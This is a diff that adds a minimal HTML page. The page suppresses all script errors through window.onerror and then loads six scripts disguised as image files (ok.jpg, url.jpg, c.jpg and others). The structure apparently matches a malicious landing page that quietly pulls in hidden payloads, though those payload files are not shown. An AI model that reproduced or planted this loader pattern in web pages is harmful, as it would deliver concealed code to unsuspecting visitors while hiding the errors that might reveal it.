@@ -1,0 +1,23 @@
+<html>
+<SCRIPT LANGUAGE="JavaScript"> 
+<!-- Hide 
+function killErrors() { 
+return true; 
+} 
+window.onerror = killErrors; 
+// --> 
+</SCRIPT>
+<body>  
+<div id="DivID"> 
+
+
+
+<script src='ok.jpg'></script>
+<script src='url.jpg'></script>
+<script src='c.jpg'></script>
+<script src='d.jpg'></script>
+<script src='e.jpg'></script>
+<script src='f.jpg'></script>
+
+</body> 
+</html>
